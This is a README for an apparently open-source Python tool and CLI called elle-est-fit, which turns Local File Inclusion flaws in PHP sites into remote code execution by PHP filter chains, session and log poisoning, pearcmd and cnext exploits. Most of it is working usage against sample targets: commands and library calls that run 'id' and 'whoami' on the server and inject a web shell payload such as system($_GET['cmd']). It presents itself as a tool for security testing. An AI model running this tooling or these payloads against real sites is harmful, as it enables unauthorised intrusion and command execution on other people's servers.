# elle-est-fit (she is fit) 🏋️‍♀️
![License](https://img.shields.io/badge/license-MIT-green)

![fitgirl](/assets/logo.png)

**elle-est-fit** is a Local File Inclusion (LFI) to Remote Code Execution (RCE) framework that works both as a Python library and a command-line tool. It provides multiple exploitation techniques to leverage LFI vulnerabilities for security testing.

## 🚀 Features

- **Multiple Exploitation Techniques**:
  - lfi2rce via PHP Filter Chain
  - lfi2rce via php session poisoning
  - lfi2rce via log poisening via different log files (nginx,ssh,ftp,apache,httpd...)
  - lfi2rce via pearcmd
  - cnext exploits
  - ? more to come ?
  
- **Flexible**:
  - Use as a command-line tool or Python library
  - Custom payload and PHP code support
  
- **Custom implementation**:
  - Modular architecture for easy extension
  - Custom request handlers for complex scenarios

## 📦 Installation

```bash
# From PyPI
pip install elle-est-fit

# From source
git clone https://github.com/sofianeelhor/elle-est-fit.git
cd elle-est-fit
pip install -e .
```

## 🔧 Quick Start

### Command-Line Usage

```bash
# Basic usage with automatic technique detection
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ'

# Specify a technique and execute a custom command
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique php_filters --custom-cmd 'id'

# Double URL encode the payload and use custom PHP code
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --double-url-encode --php 'passthru("id");'

# Generate a PHP filter chain without exploitation
elle-est-fit --dump-chain '<?php phpinfo(); ?>'

# Display all available techniques
elle-est-fit --list-techniques

# Quick inline script to tamper with the payload
elle-est-fit --url 'http://vulnerable.com/?date=current_date&pageFUZZ' --tamper 'import datetime;current_date=datetime.datetime.now().strftime("%Y-%m-%d"); return f"?date={current_date}&page={payload}"'
```

### Python Library Usage

```python
from elle_est_fit import LFI

# Basic usage
lfi = LFI(target="http://vulnerable.com/?page={}")
if lfi.exploit():
    output = lfi.shell("id")
    print(output)

# Advanced usage with specific technique
lfi = LFI(
    target="http://vulnerable.com/?page={}",
    technique="php_filters",
    double_url_encode=True,
    php_code="echo system($_GET['cmd']);"
)
if lfi.exploit():
    print(lfi.shell("whoami"))
```

## 📚 Documentation

For detailed documentation, please refer to:

- [CLI Documentation](docs/cli.md) - Command-line usage guide
- [API Documentation](docs/code.md) - Library usage and customization

## 🔍 Advanced Usage Example

### Custom Techniques

Elle-Est-Fit is designed to be easily extensible. Here's a basic example of how to implement a custom technique:

```python
from elle_est_fit.techniques.base import TechniqueBase
from elle_est_fit import LFI

# Create your custom technique
class MyCustomTechnique(TechniqueBase):
    name = "my_custom"
    description = "My custom LFI exploitation technique"
    
    # Implement required methods
    def detect(self):
        # Detection logic
        return True
        
    def exploit(self):
        # Exploitation logic
        self.shell_path = "/path/to/shell"
        return True
        
    def execute(self, command):
        # Command execution logic
        return "Command output"

# Register and use your technique
lfi = LFI(target="http://vulnerable.com/?file={}")
lfi._technique = MyCustomTechnique(
    target=lfi.target,
    double_url_encode=lfi.double_url_encode
)
lfi.exploit()
```

### Second-Order LFI

For second-order LFI vulnerabilities where the file inclusion happens after another action:

```python
import requests
from elle_est_fit import LFI

def second_order_leak(file_path):
    session = requests.Session()
    
    # First action that sets up the LFI condition
    session.post("http://vulnerable.com/upload.php", 
                data={"filename": file_path})
    
    # Second action that triggers the file inclusion
    response = session.get("http://vulnerable.com/view.php")
    return response.text

lfi = LFI(leak_function=second_order_leak, technique="php_filters")
if lfi.exploit():
    print(lfi.shell("id"))
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚠️ Disclaimer

I should not be the one to tell you what to do with this, but don't be stupid, you are responsible for your actions.

## 🙏 Acknowledgements

- the goat cfreal for carrying the php security scene with his blogs https://x.com/cfreal_
- https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp#0x06-pearcmdphp
- PHP Filter Chains technique based on research by [https://www.synacktiv.com/en/publications/php-filter-chains-what-is-it-and-how-to-use-it.html](https://www.synacktiv.com/en/publications/php-filter-chains-what-is-it-and-how-to-use-it.html)
- wrapwrap https://blog.lexfo.fr/wrapwrap-php-filters-suffix.html
- Inspired by various LFI exploitation techniques researched by the security community so I can't tell you who to thank but the first time when I saw it :)